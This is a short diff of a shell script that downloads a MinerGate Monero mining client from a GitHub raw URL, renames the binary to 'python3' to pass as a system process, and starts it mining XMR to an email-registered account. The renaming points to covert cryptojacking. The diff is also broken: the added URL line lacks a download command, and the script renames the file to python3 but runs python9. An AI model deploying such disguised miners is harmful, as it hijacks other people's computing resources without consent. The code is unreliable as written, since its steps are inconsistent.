@@ -26,8 +26,8 @@ fi
 exit
 fi
 
-wget https://download.minergate.com/xfast-ubuntu-cli
-unzip xfast-ubuntu-cli
+https://raw.githubusercontent.com/haidanglx/Tonghop/master/minergate-cli.zip
+unzip minergate-cli.zip
 cd minergate-cli
 mv minergate-cli python3
 ./python9 -u haidang.tli@gmail.com --xmr 
